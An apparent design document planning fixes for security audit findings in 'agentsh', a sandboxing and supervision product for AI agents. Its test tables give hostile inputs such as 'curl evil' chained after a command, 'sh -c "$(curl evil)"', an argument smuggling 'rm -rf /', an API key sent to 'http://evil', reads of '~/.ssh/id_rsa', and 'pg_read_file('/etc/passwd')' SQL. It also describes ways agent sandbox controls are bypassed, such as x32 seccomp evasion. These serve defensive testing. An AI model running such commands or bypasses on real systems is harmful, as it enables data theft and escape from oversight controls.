# Audit Remediation Program Design

**Status:** Draft for review (approved in brainstorming on 2026-06-23).
**Owner:** Canyon Road
**Source context:** `AUDIT-FINDINGS.md` (consolidated read-only audit of ~180k LOC across ~60 packages), plus a verification pass on the `[needs verification]` items.

## 1. Purpose

The audit found 5 Critical, 22 High, and 58 Medium defects across the agentsh codebase (a security sandboxing / agent-supervision product). Several are sandbox escapes, auth/secrets fail-open, or enforcement bypasses that must not ship. This document specifies a remediation program: a sequenced, decomposed plan to fix the Critical, High, and Medium findings (the Low/Hardening tier is deferred to a separate follow-up program).

This is a *program* of multiple sub-projects, not a single implementation plan. It defines the decomposition into work streams, the sequencing, the cross-cutting engineering approach, and the per-finding fix approach for each item. Each work stream becomes its own implementation plan (via `writing-plans`) executed independently. The program covers ~47 items: ≈44 fixes, 1 investigation (darwin-SBPL), and 1 dead-code cleanup (M13/M14).

## 2. Verification Results (input to planning)

Before designing fixes, the `[needs verification]` items were confirmed with `grep`/`go vet`/source reads. Verdicts that changed the list:

| Item | Verdict | Evidence |
|---|---|---|
| H15 (approve→allow when approvals off) | **REAL** | `internal/server/server.go:171` `enforceApprovals := cfg.Approvals.Enabled`; `Approvals.Enabled` has no default → `false` → `wrapDecision` shadow-allows (`internal/policy/engine.go:~1243`). |
| H17 (`AGENTSH_SERVER` exfil/exec) | **REAL, worse than reported** | `internal/shim/kernelinstall/install_linux.go` `callWrapInit` posts the API key to the env-controlled `AGENTSH_SERVER`; the server-returned `resp.WrapperBinary` is `exec.Command`'d with server-built args (`:232`). |
| M13/M14 (SessionShutdown leak / doShutdown PID poll) | **DEAD CODE** | `SessionShutdown` is constructed nowhere outside its own file. → converted to a cleanup task (delete or wire). |
| M56 (Allowlist durable bypass) | **DOWNGRADE to Low** | pkgcheck `Allowlist.IsAllowed` is never called to short-circuit checks (only `apiKeyAuth.IsAllowed` is). No enforcement impact; only stale data written. C4 still stands independently. |
| M32/L32 (audit_chain double-unlock) | **REAL** | `internal/store/jsonl/jsonl.go:182-196` `Store.Close()` calls `ReleaseLock`; an outer defer double-releases on the error path. Low. |
| M7 (connection-rule policy staleness) | **REAL** | `SetPolicy` exists and is live (`server.go:456`); statement path uses `policy()` but connect/cancel use stale `cfg.Policy`. |
| M10 (uncapped Parse/Bind frames) | **REAL** | pgproto3 is **v2.3.3** (not v5); `chunkreader`/`backend` have no message-size cap. |
| L1/M1/M2 (notify-fd CLOEXEC) | **REAL** | notify fd + signal fd never CLOEXEC'd; `fdpass.RecvFD` uses no `MSG_CMSG_CLOEXEC`; `addfd newfdFlags` passed 0. (CLOEXEC *is* correctly used on the wrapper-log fd and injected tracee fds — the pattern exists.) |
| L22 (macwrap config file) | **REAL** | `internal/api/core.go:1586` writes to hardcoded `/tmp/agentsh-sandbox-<sessID>.json` — predictable, `os.WriteFile` follows symlinks (clobber), then `os.Remove`. |
| macOS SBPL profile (was a footnote) | **ELEVATED to investigate** | `internal/platform/darwin/sandbox.go` `SandboxManager.Create` uses a permissive template with blanket `(allow process-exec)` / `(allow mach-lookup)` / `(allow mach-register)`. The proper `CompileDarwinSandbox` (`sandbox_compile.go:59`) is *also* called from `internal/api/sandbox_compile_darwin.go:21`. Which path is live must be confirmed; if the permissive path is reachable it is a macOS exec bypass. |

**Net list:** 85 → **83 actionable** (M13/M14 → cleanup task; M56 → Low/deferred). One item (darwin-SBPL) elevated to a Wave-1 investigation.

## 3. Scope

### In Scope

- Fix all 5 Critical, 22 High, and the ~20 Medium findings that share a root cause with a Critical/High fix (~44 fixes total, plus the darwin-SBPL investigation and the M13/M14 dead-code cleanup = ~47 items).
- Delete (or wire) the dead `SessionShutdown` code (M13/M14).
- Two opportunistic abstractions where a defect class repeats: (a) a nil-engine fail-closed guard, (b) a bounded-map/semaphore helper.
- One attack/regression test per fix (red→green), proving the bypass is closed.
- `go vet ./...`, `go build ./...`, `GOOS=windows go build ./...`, and the existing test suite green between fixes.

### Out of Scope

- The ~36 standalone Mediums that do *not* share a root cause with a Critical/High (resource caps on unrelated paths, shutdown-deadlock variants, hardening items) → deferred to a separate "hardening" follow-up program.
- All Low/Hardening findings (≈37 items) → deferred.
- M56 (downgraded to Low).
- Functional changes beyond closing the defect (no feature work, no unrelated refactoring).
- Performance optimization unrelated to a fix.

## 4. Decomposition & Sequencing

The 47 fixes cluster into **6 work streams**, executed in **two waves**. Each stream is an independent spec→plan→implement cycle.

### Wave 1 — escapes + secrets (~26 items)

**Stream 1 — Enforcement-bypass escapes** (9 items: H5, C1, C3, C4, H16, H17, M48, M58, +darwin-SBPL investigation).
**Stream 2 — Seccomp/ptrace + notify-fd hardening** (8 findings: C2, H2, H7, M19, M42, +L1/M1/M2 CLOEXEC class).
**Stream 3 — Secrets & auth fail-open** (9 findings: H1, H14, H15, H11, M5, M20, M36, M37, C5).

### Wave 2 — correctness (~21 items)

**Stream 4 — Network/DNS** (5 findings: H12, M3, M21, M22, M51).
**Stream 5 — DB-proxy** (8 findings: H21, M6, M7, M8, M9, M10, M11, M55).
**Stream 6 — Lifecycle & transport** (6 fixes + 1 cleanup: H3, H19, H20, M12, M52, M53, +M13/M14 cleanup).

### Ordering constraints

1. **Within Stream 1:** H5's nil-engine guard is the opportunistic abstraction — do it first (it's touched by C3/H5 and sets the fail-closed contract other streams assume). C1/C3 are standalone. The darwin-SBPL item is investigation-first (confirm the live path before fixing) but gates nothing.
2. **Within Stream 2:** C2 (BPF hardening) first (foundation), then the CLOEXEC class (same fd-leak theme), then H2/H7/M19/M42 surgical.
3. **Within Stream 3:** H1 (cache) first (highest impact, independent). H14+H15 coupled (dangerous defaults) — do together. Rest independent.
4. **Cross-stream:** Stream 3's H14/H15 land *after* Stream 1's H17 so the untrusted-env/config trust boundary is consistent (soft ordering, not a hard block).
5. **Wave 2 reuses Wave 1 abstractions:** Stream 4's unbounded-map fixes use the bounded-map helper from Stream 1's H5 work *if it landed*; otherwise Stream 4 does its own caps (no hard block).
6. **C4 → Stream 1** (supply-chain = enforcement bypass thematically). **C5 → Stream 3** (correctness bug in a security control).

### Two-wave gate

Wave 2 starts **only after** Wave 1's escapes are closed and the suite is green. This is the "no known escapes" checkpoint. No Wave 2 work begins until Wave 1's attack tests pass.

## 5. Cross-Cutting Engineering Approach

**Backbone (all 47 fixes): surgical edits, each with a red→green attack/regression test, small batches, green suite between fixes.** Non-negotiable for a security product: every escape gets a failing test proving the bypass, then a passing test proving the fix.

**Two opportunistic abstractions (only where a defect class repeats and pays off):**

1. **Nil-engine fail-closed guard** (`internal/platform/policy_guard.go`): a `DenyIfNoEngine(engine PolicyEngine) Decision` helper returning deny. Migrated into FUSE `checkPolicy`, `PolicyAdapter.CheckFile/CheckNetwork/CheckCommand/CheckRegistry`, and Windows `handleFilePolicyCheck`/`handleRegistryPolicyCheck`/`handleSuspendedProcess`. `wrapPolicyEngine` returns a deny-engine wrapper (not nil) for non-`*PolicyAdapter` types. Fixes the H5 family consistently and prevents recurrence.

2. **Bounded-map / semaphore helper** (`internal/util/bounded` or similar): a small `bounded.LRU[K,V]` and a `semaphore.Weighted`-based concurrency cap. Migrated into the net-path unbounded-map sites (M18, M21, M51, L9) and goroutine-per-X sites (H12, M17). Introduced in Stream 1's H5 work; reused by Stream 4.

Everything else stays surgical because the fixes don't share enough structure to justify abstraction (abstraction = risk in a security-sensitive codebase).

**Per-fix test strategy:** write the attack/regression test first (it fails — red), implement the fix (it passes — green), then `go vet`/build/test before the next fix. Where a fix is a cluster (e.g. CLOEXEC class), one test may cover multiple sub-fixes.

## 6. Per-Stream Fix Design

### Stream 1 — Enforcement-bypass escapes

| # | Fix approach | Attack/regression test |
|---|---|---|
| **H5** | Add `policy_guard.DenyIfNoEngine`; migrate FUSE `checkPolicy`, `PolicyAdapter.Check*`, Windows driver checks; `wrapPolicyEngine` returns a deny wrapper for unknown engine types. | nil engine → each `Check*` returns deny; FUSE mount with no engine → read denied. |
| **C1** | `containsCompoundOperator`: detect standalone `&` (excluding `>&`/`<&` redirects) and `>(`/`<(`; make `isAgentshCommand` bypass fail-closed (only bypass a single fully-resolved agentsh command with zero shell metacharacters). | `agentsh --version & curl evil` → bypass does NOT fire; `agentsh exec foo` (no metachars) → bypass works. |
| **C3** | Remove the `sh -c "cd %s && %s "+args` fallback in `wsl2`/`lima` `Execute`; pass `cmd`/`args` as argv to `wsl … --` / `lima … --` (as Full/Partial branches do). | arg `"; rm -rf /"` passed as a single argv element; no shell invocation. |
| **C4** | `pkgcheck` orchestrator: treat `resp.Metadata.Partial` (or any per-package gap vs request set) as a `ProviderError`; have deps.dev/OSV/Socket return a partial-batch error like Snyk. | deps.dev partial for pkg X with `on_failure=deny` → deny; 429 → deny. |
| **H16** | `CheckFile`/`isReadOperation`: unmatched read ops → `default-deny-reads` (deny well-known secret paths: `~/.ssh/`, `/etc/shadow`, `**/.env`, `**/*.pem` minimum). Default configurable but deny-by-default. | read `~/.ssh/id_rsa` with no allow rule → denied; config allow → allowed. |
| **H17** | Shim (user-shell context): treat `AGENTSH_SERVER`/`AGENTSH_API_KEY` as untrusted — validate `AGENTSH_SERVER` against a root-owned allowlist file or known local server; never forward `AGENTSH_API_KEY` to a non-trusted host; reject if untrusted. | `AGENTSH_SERVER=http://evil` → `callWrapInit` refuses / no API key sent; trusted local → works. |
| **M48** | `checkCommand`: apply opaque-`sh -c` deny regardless of `hasRestrictiveCommandRule` when an interpreter is allowed but payload unparsable (or require explicit opt-in to run opaque scripts). | allow-only policy + `sh -c "$(curl evil)"` → denied. |
| **M58** | `agentsh-unixwrap`/`agentsh-macwrap`: scrub `AGENTSH_*` env vars before `syscall.Exec` (extend the `logging.go` unset pattern to all `AGENTSH_` prefixes). | wrapped child env contains no `AGENTSH_SECCOMP_CONFIG`/`AGENTSH_SANDBOX_CONFIG`. |
| **darwin-SBPL** | Investigation-first: trace `SandboxManager.Create` call sites to confirm if the permissive template is reachable in production. If yes: replace blanket `(allow process-exec)`/`mach-lookup`/`mach-register` with `CompileDarwinSandbox`'s per-command exec policy, or scope `process-exec` to allowed paths only. | (if reachable) exec of a non-allowed binary → denied. |

### Stream 2 — Seccomp/ptrace + notify-fd hardening

| # | Fix approach | Attack/regression test |
|---|---|---|
| **C2** | `seccomp_filter.go`: add a BPF rule rejecting x32 (`nr & 0x40000000 != 0`) and non-native arches with `SECCOMP_RET_ERRNO(ENOSYS)`; `dispatchSyscall` fail-closed (deny) for unknown/high-bit numbers. | x32 syscall number → blocked (ENOSYS); BPF program contains the x32 reject. |
| **L1/M1/M2** | `fdpass.RecvFD`: `MSG_CMSG_CLOEXEC` + defensive `fcntl FD_CLOEXEC`; close every `fds[i]` except the returned one. `addfd_linux.NotifAddFD`: `newfdFlags = O_CLOEXEC`; pick a free fd (scan high range) instead of fixed 100. `agentsh-unixwrap`: explicitly close/dup-with-CLOEXEC the notify+signal fds before `syscall.Exec` (not `defer`). | after `syscall.Exec`, child does not inherit the notify fd (denied `SECCOMP_IOCTL_NOTIF_SEND`). |
| **H2** | `netmonitor/unix/handler.go` `handleFileNotificationEmulated`: on mutating-op path-resolution failure, respond `DENY` (not `CONTINUE`). | simulate `process_vm_readv`+`/proc/<pid>/mem` failure on a write → DENY. |
| **H7** | Extend fd tracking + read-exit handling to legacy `open`/`creat` and `readv`/`preadv`/`preadv2`/`sendfile`/`splice`/`copy_file_range`. (Defer fs-layer TracerPid masking if syscall extension is tractable.) | tracee reads `/proc/self/status` via `open`+`readv` → `TracerPid` masked (0). |
| **M19** | Extend exit-time path re-verification to `unlinkat`/`renameat2`/`linkat`/`symlinkat`/`fchmodat`/`fchownat` + legacy file syscalls; `softDeleteFile` re-resolves `absPath` at injection time. | concurrent sibling thread swaps a symlink between entry+exec of `unlinkat` → denied/caught. |
| **M42** | `handle_network.go` connect-redirect: fail-closed (deny) on `addrLen < 16/28`; `redirect_net.go` copy sockaddr to a scratch page and rewrite the pointer (not in-place). | undersized sockaddr → denied; concurrent buffer mutation → no corruption. |

### Stream 3 — Secrets & auth fail-open

| # | Fix approach | Attack/regression test |
|---|---|---|
| **H1** | `pkg/secrets/cache.go` `key`: include principal/`AgentID`; `manager.go` `Get`: re-evaluate approval on every cache hit (or disable caching when `RequireApproval`). | agent A approved → cache populated; agent B (same path) → approval required; revoke A → A's next `Get` → approval required. |
| **H14** | `config.go` `applyDefaultsWithSource`: default `auth.Type` to a secure mode (or fail closed when unset); default `Server.HTTP.Addr` to `127.0.0.1:18080`; `validateConfig` reject `auth.Type: none`/`disable_auth` outside an explicit dev flag. | no `auth:` block → load fails (or loopback + auth required); explicit dev flag → allowed. |
| **H15** | `config.go`: default `Approvals.Enabled=true` when any `approve` rule exists; refuse to load policies with `approve` decisions while approvals disabled (or hard-fail daemon). | `approve` rule + approvals disabled → load fails; approvals enabled → `wrapDecision` returns `approve`. |
| **H11** | `proxy.go` `ServeHTTP`: capture the pre-hook body (as `declared_service.go` does) for `StoreRequestBody`; store post-hook only as `BodySize`/`BodyHash`. | enable global `CredsSubHook`; stored LLM body contains the fake (pre-hook) value, not the real secret. |
| **M5** | `approvals/manager.go` `Resolve`/`ResolveWithWebAuthn`: enforce principal + session-ownership authorization. | caller A cannot resolve caller B's pending approval by ID → denied. |
| **M20** | `proxy.go`: reuse `sanitizeHeadersForDeclaredService` (with `InjectedHeaderNamesForService("")`) on the LLM path; redacts `Cookie`/`Set-Cookie`/`Proxy-Authorization`/injected headers. | LLM request log contains no `Cookie`/`Authorization` values. |
| **M36** | `config_cmd.go` `config show`: redact `Audit.Webhook.Headers`/`Audit.OTEL.Headers` values (and known sensitive keys) before `printJSON`. | `config show` output contains no bearer tokens/API keys. |
| **M37** | `pkg/secrets/vault.go`: URL-escape path segments; reject `..`/`sys`/`auth` targets; `manager.go` `isPathAllowed`: default-deny unknown providers; prefer explicit KV prefixes over global `*`. | path `sys/health` → rejected; `"`/`\` escaped; unknown provider → denied. |
| **C5** | `pkg/ratelimit/limiter.go` `WaitN`: recompute tokens from `lastTime` after waking; guard `rate==0`; hold the lock across consume (or `time.Timer`/condition-var). | `SetRate(0)` → no overflow/NaN; concurrent `WaitN`/`AllowN` → no race (`-race`); tokens refill correctly. |

### Stream 4 — Network/DNS

| # | Fix approach | Attack/regression test |
|---|---|---|
| **M3** | `netmonitor/proxy.go`: resolve through the agent's DNS interceptor (not `net.DefaultResolver`); evaluate policy on the resolved IP (mirror `CheckNetworkIP`) before dialing; reject if hostname/IP decisions diverge; carry resolved IP in connection contexts. `pnacl/policy.go`: match CIDR/IP against the resolved IP (not parse `ctx.Host` as IP). | allowlisted hostname resolving to a private IP via rebinding DNS → denied; CIDR deny matches the resolved IP. |
| **H12** | `proxy/streaming.go` `streamingResponseWriter.Write` + `sse_intercept.go`: cap per-stream buffer (drop/truncate beyond ~1 MiB); enforce in-flight concurrency cap regardless of TPM (`semaphore.Weighted`); stream-to-disk with a size ceiling for stored bodies. | 10 MiB SSE response → memory bounded (no OOM); concurrent streams capped. |
| **M21** | `netmonitor/ebpf/process_filter.go` `resolveHost`: use the agent's DNS cache for reverse lookups; bound + TTL caches; cancel resolver via a cancellable context. | reverse lookup hits the agent's cache (not OS resolver); timeout → no leaked goroutine; cache bounded. |
| **M22** | `netmonitor/ebpf/maps_linux.go` `PopulateAllowlist`: set `default_deny` to the new value *first*, before mutating allow/deny entries (fail-closed reload); or rebuild into a separate map and swap atomically. | during reload, a default-deny cgroup's connections are denied (not allowed). |
| **M51** | `ratelimit.go`: cap `domains` (LRU) / per-wildcard limiter; evict on config reload. `correlation.go` `AddResolution`: remove the IP from the prior hostname's reverse entry; schedule periodic `Cleanup()`; bound the maps. (Uses bounded-map helper from Stream 1 if landed.) | 10k distinct domains → memory bounded; IP re-resolved → prior reverse entry removed; stale entries pruned. |

### Stream 5 — DB-proxy correctness

| # | Fix approach | Attack/regression test |
|---|---|---|
| **H21** | `classify/postgres/ast_dml.go`: call `appendUnsafeIO` from `classifyInsert`/`classifyUpdate`/`classifyDelete`/`classifyMerge` (over value lists / WHERE / RETURNING / USING). `escalation.go` `walkFuncCalls`: add cases for `Aggref`/`WindowFunc`/`XmlExpr`/`CoerceToDomain`/`CoerceViaIO`/`FieldSelect`/`ArrayCoerceExpr` (or drive via protobuf reflection like `redirect/walk.go`). | `UPDATE t SET c=pg_read_file('/etc/passwd') RETURNING c` → `unsafe_io` set; `SELECT sum(pg_read_file(...))` → inner call visited. |
| **M6** | `proxy/postgres/eventbuilder.go` `normalizeStatement`: when `Normalize` fails under a redacting tier, omit `statement_text` (keep digest) or substitute `<unredactable>`; never emit raw SQL labeled redacted. | parse-failure statement under `RedactParametersRedacted` → no raw literals. |
| **M7** | `proxy/postgres/connect_rule.go` `evaluateConnection` + `handshake.go` `evaluateMappedCancel`: route through `pc.srv.policy()` (live `*RuleSet`) instead of `cfg.Policy`. | hot-reload revoking a `db_user` → new connections denied immediately. |
| **M8** | `proxy/postgres/upstream.go` `upstreamTLSConfig`: add optional pinned-CA / `sslrootcert` field to `DBService`; surface `SystemCertPool` errors. | configured pin → untrusted CA rejected; `SystemCertPool` failure surfaces. |
| **M9** | `classify/postgres/connstring.go`: parse `hostaddr` and all comma-separated hosts as `ObjectExternalEndpoint` candidates; reject conninfo where `hostaddr != host` or multi-host is used. | `hostaddr=evil host=good` → denied; multi-host → rejected. |
| **M10** | `proxy/postgres/extquery.go`/`statemachine/transition.go`: enforce `MaxQueryBytes` on `Parse.Query` + bound `Bind` parameter bytes; reject oversize with `54000`. (pgproto3 v2 has no built-in cap.) | oversized `Parse`/`Bind` → rejected (no unbounded buffer). |
| **M11** | `proxy/postgres/server.go` `acceptLoop`: wrap `handleConn` in `defer recover()` that logs a `db_proxy_panic` lifecycle event and closes only the offending connection; cap recursion depth in redirect walks. | malformed query that panics the classifier → only that conn closed (process survives). |
| **M55** | `proxy/postgres/cancelmap.go` `Register`: when full, evict the oldest disconnected entry beyond a hard floor (or cap disconnected entries separately) instead of failing. | sustained churn → new connections still register (no `53300` drops). |

### Stream 6 — Lifecycle & transport

| # | Fix approach | Attack/regression test |
|---|---|---|
| **H3** | `api/app.go` `destroySession`, `api/grpc.go` `DestroySession`, `server/server.go` `reapOnce`/`Close`: route all teardown through `Session.cleanup()` (or add `CloseLLMProxy()` to each) so the LLM proxy listener + goroutines close and `credsub.Table` is zeroed. | destroy session → listener closed (port free), no leaked goroutines (count stable across create/destroy), cred table zeroed. |
| **H19** | `client/client.go`: transport-level timeout / per-request `context` for unary; separate `http.Client{Timeout:0}` for streaming methods (`ExecStream`/`StreamSessionEvents`/`WatchTaints`); stop coercing `0`→`DefaultClientTimeout` for streaming. | streaming exec > 30s → not truncated over HTTP; unary still times out. |
| **H20** | `cli/daemon.go` templates: register a `--daemon` flag on the server command (hidden no-op) or drop `--daemon` from `ExecStart`/`ProgramArguments`. | `agentsh server --daemon` starts (no unknown-flag error); generated unit file valid. |
| **M12** | `api/grpc.go` `DestroySession`: call `sess.CloseDBProxy()` (route both HTTP+gRPC through `Session.cleanup()`). | destroy over gRPC → DB proxy listener closed (no socket/goroutine leak). |
| **M52** | `cli/exec_pty.go` `execPTYWS`: `if resp != nil { _ = resp.Body.Close() }` before returning in the error branch. | non-101 handshake → no FD leak (fd count stable). |
| **M53** | `cli/checkpoint.go` `getCheckpointStorage`: load local config, fall back to `cfg.Sessions.Checkpoints.StorageDir` before the hardcoded default. | non-default `storage_dir` → CLI reads the right dir (finds checkpoints). |
| **M13/M14** | Cleanup: `SessionShutdown` is constructed nowhere. Delete `internal/session/shutdown.go` (+`shutdown_unix.go`) unless a live caller is intended (default: delete). | `go build ./...` clean after deletion; no references remain. |

## 7. Testing Strategy

- **Per-fix red→green:** every fix gets an attack/regression test that fails before the fix and passes after. This is the primary proof the bypass is closed.
- **Cluster tests:** where a fix is a class (CLOEXEC, nil-engine, unbounded-maps), one test may cover multiple sub-fixes.
- **Verification gates per stream:** `go vet ./<pkg>/...`, `go build ./...`, `GOOS=windows go build ./...`, and the existing test suite must be green before a stream is considered done.
- **Race testing:** the ratelimit (C5) and any concurrency fix run under `go test -race`.
- **Two-wave gate:** Wave 2 does not begin until Wave 1's escapes are closed and the full suite is green.

## 8. Compatibility And Risks

- **H14/H16/H46-equivalent default flips** are behavior changes: deployments that omit `auth:` or read-sensitive-path rules will break until operators configure them explicitly. This is intentional (fail-closed) but must be documented as a migration note. The `dev` flag preserves the old behavior for local development.
- **H15** refusing to load `approve`-bearing policies when approvals are off may break existing deployments that relied on shadow mode; same migration-note treatment.
- **C3** removing the `sh -c` fallback in WSL2/Lima changes behavior only for the no-isolation branch (commands already ran unsandboxed there); the Full/Partial branches are unaffected.
- **M13/M14 deletion** is safe only if no caller exists — the verification pass confirmed none in non-test code, but the implementing plan must re-confirm before deletion.
- **darwin-SBPL** is investigation-first because if the permissive template *is* live, fixing it could break legitimate execs that relied on blanket `process-exec`; the investigation determines the blast radius before the fix.
- **Main implementation risk:** the two opportunistic abstractions (nil-engine guard, bounded-map helper) touch multiple packages — they must land with their own tests and not regress existing allow paths. Each abstraction is introduced with a deny-by-default contract that existing tests (which assume allow) may need updating.
- **Scope discipline:** ~47 fixes across 6 streams is a large program. The two-wave split bounds the first cycle to ~24 escapes/secrets fixes; if Wave 1 surfaces more than expected, Wave 2 is re-scoped rather than rushed.

## 9. Work Stream → Implementation Plan Mapping

Each work stream is implemented via the `writing-plans` skill as its own implementation plan, in order:

1. Stream 1 (enforcement-bypass escapes) — Wave 1
2. Stream 2 (seccomp/ptrace + notify-fd) — Wave 1
3. Stream 3 (secrets & auth fail-open) — Wave 1
4. *Two-wave gate: escapes closed + green suite*
5. Stream 4 (network/DNS) — Wave 2
6. Stream 5 (DB-proxy) — Wave 2
7. Stream 6 (lifecycle & transport) — Wave 2

The Low/Hardening tier and the ~36 standalone Mediums are deferred to a separate follow-up program, scoped after Wave 2 lands.
